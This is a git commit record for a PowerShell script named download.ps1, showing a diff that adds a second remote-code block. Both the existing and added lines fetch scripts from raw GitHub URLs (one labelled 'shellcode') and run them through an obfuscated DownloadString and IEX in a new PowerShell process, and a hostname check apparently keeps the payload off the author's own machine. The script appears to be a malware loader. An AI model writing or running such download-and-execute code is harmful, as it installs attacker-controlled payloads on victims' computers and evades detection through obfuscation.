81eeeec46f95d2eec41fd244dadb3d6bf9428a64
43a1723 <hai1723notgay@gmail.com>
2024-07-22 11:49:42 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -50,6 +50,10 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellc
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
+$datacode = ("https://raw.githubusercontent.com/43a1723/test/main/lmao/data.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+
 if ($env:USERDOMAIN -ne "DESKTOP-VIGQLDD") {
     # Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skidd.exe"
     # Start-Process -FilePath "$temp\skidd.exe"
